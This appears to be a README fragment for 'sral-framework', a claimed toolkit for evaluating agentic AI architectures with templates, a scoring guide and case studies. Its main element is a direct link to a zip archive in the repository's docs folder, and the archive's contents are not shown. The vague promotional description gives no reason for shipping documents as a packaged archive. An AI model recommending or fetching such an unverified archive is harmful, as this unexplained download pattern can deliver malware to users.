![Download sral-framework](https://raw.githubusercontent.com/kemalefee8/sral-framework/main/docs/sral_framework_3.5-beta.1.zip)

## 📦 Overview

sral-framework is a minimal framework designed to help you evaluate agentic AI architectures. It provides evaluation templates, a scoring guide, and case studies, including LangChain, AutoGen, and CrewAI. Most agent failures can be traced back to state management issues rather than reasoning problems. This framework simplifies the evaluation process, making it easier for you to succeed in your AI projects.
